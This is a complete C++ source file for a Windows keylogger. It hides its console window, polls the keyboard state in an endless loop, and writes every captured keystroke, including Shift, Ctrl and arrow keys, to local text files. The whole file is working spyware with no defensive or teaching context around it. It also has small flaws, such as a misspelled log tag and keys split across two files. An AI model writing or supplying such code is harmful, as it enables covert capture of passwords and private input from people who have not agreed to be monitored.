// Include necessary headers
#define _WIN32_WINNT 0x0500
#include <Windows.h>  // For Windows API functions
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

// Function to log input to a file
void LOG(string input)
{
    // Open the log file in append mode
    fstream LogFile;
    LogFile.open("keys.txt", fstream::app);
    // Check if the file is successfully opened
    if (LogFile.is_open())
    {
        // Write input to the log file
        LogFile << input;
        // Close the log file
        LogFile.close();
    }
}

// Function to handle special keys
bool SpecialKeys(int S_Key)
{
    switch (S_Key)
    {
    case VK_SPACE:
        cout << " ";
        LOG(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        LOG("\n");
        return true;
    case '¾':
        cout << ".";
        LOG(".");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        cout << "\b";
        LOG("\b");
        return true;
    case VK_RBUTTON:
        cout << "#R_CLICK#";
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        LOG("#CAPS_LCOK");
        return true;
    case VK_TAB:
        cout << "#TAB";
        LOG("#TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL";
        LOG("#CONTROL");
        return true;
    case VK_MENU:
        cout << "#ALT";
        LOG("#ALT");
        return true;
    default: 
        return false;
    }
}

// Main function
int main()
{
    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';

    // Infinite loop to continuously monitor keys
    while (true)
    {
        Sleep(10);  // Sleep for 10 milliseconds to reduce CPU usage
        // Loop through possible key codes
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            // Check if the current key is pressed
            if (GetAsyncKeyState(KEY) == -32767)
            {
                // If it's a special key, handle it
                if (SpecialKeys(KEY) == false)
                {
                    // If it's not a special key, log it
                    fstream LogFile;
                    LogFile.open("data.txt", fstream::app);
                    if (LogFile.is_open())
                    {
                        LogFile << char(KEY);  // Log the character associated with the key
                        LogFile.close();
                    }
                }
            }
        }
    }

    return 0;  // Return 0 to indicate successful execution
}
